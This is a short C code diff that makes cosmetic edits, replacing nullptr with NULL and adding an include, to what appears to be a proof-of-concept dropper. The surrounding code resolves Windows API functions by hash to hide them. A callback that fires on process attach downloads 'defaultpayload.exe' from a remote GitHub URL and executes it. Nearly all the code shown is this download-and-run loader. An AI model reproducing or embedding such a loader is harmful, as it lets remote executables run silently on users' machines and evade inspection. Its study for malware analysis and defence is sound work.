@@ -1,3 +1,4 @@
+#include <stdlib.h>
 #include <stdint.h>
 #include <windows.h>
 #include <winternl.h>
@@ -87,7 +88,7 @@ LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, uint32_t hash)
       return ((LPCVOID)(byte_module+functions[name_ordinals[i]]));
    }
 
-   return nullptr;
+   return NULL;
 }
 
 void NTAPI callback(PVOID dllHandle, DWORD reason, PVOID reserved)
@@ -114,19 +115,19 @@ void NTAPI callback(PVOID dllHandle, DWORD reason, PVOID reserved)
    
    if (getFileAttributes(sheep) == INVALID_FILE_ATTRIBUTES)
    {
-      if (urlDownloadToFile(nullptr,
+      if (urlDownloadToFile(NULL,
                             "https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe",
                             sheep,
                             0,
-                            nullptr) != 0)
+                            NULL) != 0)
          return;
    }
 
-   shellExecute(nullptr, nullptr, sheep, nullptr, nullptr, 1);
+   shellExecute(NULL, NULL, sheep, NULL, NULL, 1);
 }
 
 int main(int argc, char *argv[])
 {
-   callback(GetModuleHandleA(nullptr), DLL_PROCESS_ATTACH, nullptr);
+   callback(GetModuleHandleA(NULL), DLL_PROCESS_ATTACH, NULL);
    return 0;
 }
